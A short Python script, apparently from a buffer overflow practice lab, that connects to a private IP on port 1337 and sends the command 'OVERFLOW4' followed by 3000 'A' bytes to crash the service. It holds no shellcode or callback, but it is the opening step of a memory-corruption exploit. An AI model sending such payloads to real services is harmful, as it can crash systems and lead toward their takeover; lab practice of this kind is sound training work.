#!/usr/bin/env python3

import socket

host, port = "10.10.191.46", 1337

command = b"OVERFLOW4 "

payload = b"".join([
	command,
	b"A" * 3000,
])

with socket.socket() as s:
	s.connect((host, port))
	# banner = s.recv(4096).decode("utf-8").strip()
	s.send(payload)